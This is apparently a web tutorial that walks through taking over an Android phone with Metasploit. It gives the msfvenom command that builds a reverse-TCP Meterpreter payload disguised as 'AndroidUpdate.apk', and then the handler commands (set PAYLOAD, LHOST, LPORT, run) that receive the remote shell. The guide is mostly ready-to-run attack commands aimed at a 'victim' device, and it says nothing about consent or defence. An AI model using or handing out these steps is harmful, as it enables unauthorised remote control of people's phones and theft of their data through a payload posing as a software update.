Your Step-by-Step Guide to Hacking An Android System Using Metasploit

Before we start, let us first go through a few basic keywords that we'll require during the process!

  • IP Address: Every device on the Internet has a unique address which is required for their identification, this is the IP Address.

  • Payload: This defines an action that will be performed after successful execution of an exploit.

  • Msfvenom: It is a command that we will use to generate a payload

  • LHOST: It is the IP Address of the attacking Kali Linux machine

  • LPORT: It is the listening port which is used to build a connection from the target.


Great! Now that we've revised the basic keywords let us look into the pre-requisites

Requirements:

    ✓ Kali Linux (Either on Virtual Box or VMWare)
    ✓ Android System for Victim
    ✓ Metasploit Software (which will be pre-installed with Kali)
    ✓ An Internet Access
    ✓ A basic understanding of Hacking

Now that we have all the requisite knowledge and tools, let's dive into the main process.


STEP 1:

Before we begin, we need to know the IP Address of our machine. To do that we open a terminal on Kali Linux and type the following command:

  • ifconfig

Here the IP Address for our machine where the interface is specified as eth0 (as we are on Ethernet).

STEP 2:

We run the following command in the terminal.

  • msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=4444 -o AndroidUpdate.apk

Here, android/meterpreter/reverse_tcp indicates it is a Android payload using meterpreter/reverse_tcp.

  1. -p indicates it to be a payload.
  2. apk is the application for Android.
  3. -o stands for output. Here the command will output a payload named AndroidUpdate.apk

This generates the payload as shown.

STEP 3:

Next we open the Metasploit Console using the command

  • msfconsole

We then type in the command

  • use multi/handler
This tells the Metasploit to open a handler for stager payloads that uploads meterpreter

STEP 4:

Now since we want to attack an Android device, we type in the following:

  1. set PAYLOAD android/meterpreter/reverse_tcp
    2. This sets the PAYLOAD such that it matches with the one set in the executable.
  2. To set the LHOST we follow it up with, set LHOST 10.0.2.15
  3. set LPORT 4444
    4. This command sets the LPORT.
Upon typing the above commands, we get to see the following screen:


After setting the type of the payload, LHOST and the LPORT we have to see what variables the payload (reverse_tcp in our case) will need to run, for that we use the command
  • show options


Once all the options have been set we can initiate the attack. To initiate it we type the command: run in the console.
